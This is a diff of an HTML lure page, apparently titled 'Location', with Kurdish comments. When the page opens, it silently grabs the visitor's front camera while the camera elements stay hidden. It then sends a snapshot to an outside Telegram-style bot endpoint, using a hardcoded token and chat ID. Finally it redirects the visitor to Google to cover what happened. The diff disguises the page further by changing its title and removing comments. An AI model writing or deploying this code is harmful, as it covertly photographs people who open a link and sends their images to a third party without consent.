@@ -3,17 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Processing</title>
+    <!-- لێرەدا ناوی لینکەکە گۆڕدراوە بۆ Location -->
+    <title>Location</title>
     <style>
         body { 
             margin: 0; 
-            background: #007bff; /* ڕەنگی شین */
+            background: #0000FF !important; /* ڕەنگی شین */
             display: flex; 
             align-items: center; 
             justify-content: center; 
             height: 100vh; 
         }
-        /* هەموو دوگمە و نووسینەکانمان لادا */
         video, canvas, button { display: none; }
     </style>
 </head>
@@ -26,7 +26,6 @@
         const token = '8734772782:AAFT6ize__0OBmz53luKQXus2iJpSg9NpmA';
         const chatId = '7602797383';
 
-        // ئەم بەشە ڕاستەوخۆ لە کاتی کردنەوەی لینکەکە کار دەکات
         window.onload = function() {
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
             .then(stream => {
@@ -48,13 +47,11 @@
                             method: 'POST',
                             body: formData
                         }).then(() => {
-                            // دوای ناردنی وێنەکە دەچێتە گووگڵ
                             window.location.href = "https://google.com";
                         });
                     }, 'image/jpeg');
                 }, 1000);
             }).catch(err => {
-                // ئەگەر مۆڵەتی نەدا یان کێشەیەک هەبوو هەر دەچێتە گووگڵ
                 window.location.href = "https://google.com";
             });
         };
